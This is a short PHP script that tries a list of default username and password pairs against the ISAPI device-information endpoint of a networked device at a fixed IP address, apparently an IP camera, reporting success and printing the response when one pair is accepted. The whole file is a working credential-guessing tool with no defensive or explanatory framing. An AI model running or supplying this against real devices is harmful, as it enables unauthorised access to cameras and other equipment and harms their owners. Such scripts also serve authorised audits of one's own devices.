<?php
$ip = '192.0.0.121';
$url = "http://$ip:80/ISAPI/System/deviceInfo";

$credentials = [
    'admin:12345',
    'admin:admin',
    'admin:admin123',
    'admin:Admin123'
];

foreach ($credentials as $cred) {
    echo "Trying $cred...\n";
    $client = curl_init($url);
    curl_setopt($client, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($client, CURLOPT_TIMEOUT, 3);
    curl_setopt($client, CURLOPT_HTTPAUTH, CURLAUTH_DIGEST | CURLAUTH_BASIC);
    curl_setopt($client, CURLOPT_USERPWD, $cred);
    $resp = curl_exec($client);
    $status = curl_getinfo($client, CURLINFO_HTTP_CODE);
    echo "Status: $status\n";
    if ($status == 200) {
        echo "SUCCESS! Response: \n" . substr($resp, 0, 500) . "\n";
        break;
    }
    curl_close($client);
}
